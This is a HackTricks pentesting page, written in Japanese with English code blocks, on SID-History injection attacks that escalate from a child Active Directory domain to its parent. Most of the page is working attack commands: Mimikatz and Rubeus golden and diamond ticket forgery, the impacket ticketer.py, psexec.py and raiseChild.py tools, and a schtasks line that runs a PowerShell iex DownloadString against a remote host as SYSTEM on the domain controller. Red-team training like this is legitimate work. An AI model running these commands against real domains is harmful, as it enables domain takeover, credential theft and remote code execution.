# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack**の焦点は、**ドメイン間のユーザー移行を支援し**、以前のドメインからのリソースへの継続的なアクセスを確保することです。これは、**ユーザーの以前のセキュリティ識別子（SID）を新しいアカウントのSID履歴に組み込むことによって**達成されます。特に、このプロセスは、親ドメインからの高特権グループ（例えば、Enterprise AdminsやDomain Admins）のSIDをSID履歴に追加することで、不正アクセスを許可するように操作できます。この悪用により、親ドメイン内のすべてのリソースへのアクセスが付与されます。

この攻撃を実行するための2つの方法があります：**Golden Ticket**または**Diamond Ticket**の作成です。

**"Enterprise Admins"**グループのSIDを特定するには、まずルートドメインのSIDを見つける必要があります。特定した後、Enterprise AdminsグループのSIDは、ルートドメインのSIDに`-519`を追加することで構築できます。例えば、ルートドメインのSIDが`S-1-5-21-280534878-1496970234-700767426`の場合、"Enterprise Admins"グループのSIDは`S-1-5-21-280534878-1496970234-700767426-519`になります。

**Domain Admins**グループも使用できますが、これは**512**で終わります。

他のドメインのグループ（例えば"Domain Admins"）のSIDを見つける別の方法は次の通りです：
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### ゴールデンチケット (Mimikatz) と KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
ゴールデンチケットに関する詳細は、以下を確認してください：

{{#ref}}
golden-ticket.md
{{#endref}}

### ダイヤモンドチケット (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
ダイヤモンドチケットに関する詳細は、以下を確認してください：

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
侵害されたドメインのKRBTGTハッシュを使用して、ルートまたはエンタープライズ管理者のDAに昇格させる:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
攻撃から取得した権限を使用して、新しいドメインでDCSync攻撃を実行できます：

{{#ref}}
dcsync.md
{{#endref}}

### Linuxから

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)を使用した手動操作
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### 自動的に [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) を使用

これは、**子ドメインから親ドメインへの昇格を自動化する** Impacket スクリプトです。スクリプトには以下が必要です：

- ターゲットドメインコントローラー
- 子ドメインの管理者ユーザーのクレデンシャル

フローは次の通りです：

- 親ドメインのエンタープライズ管理者グループの SID を取得
- 子ドメインの KRBTGT アカウントのハッシュを取得
- ゴールデンチケットを作成
- 親ドメインにログイン
- 親ドメインの管理者アカウントのクレデンシャルを取得
- `target-exec` スイッチが指定されている場合、Psexec を介して親ドメインのドメインコントローラーに認証します。
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## 参考文献

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
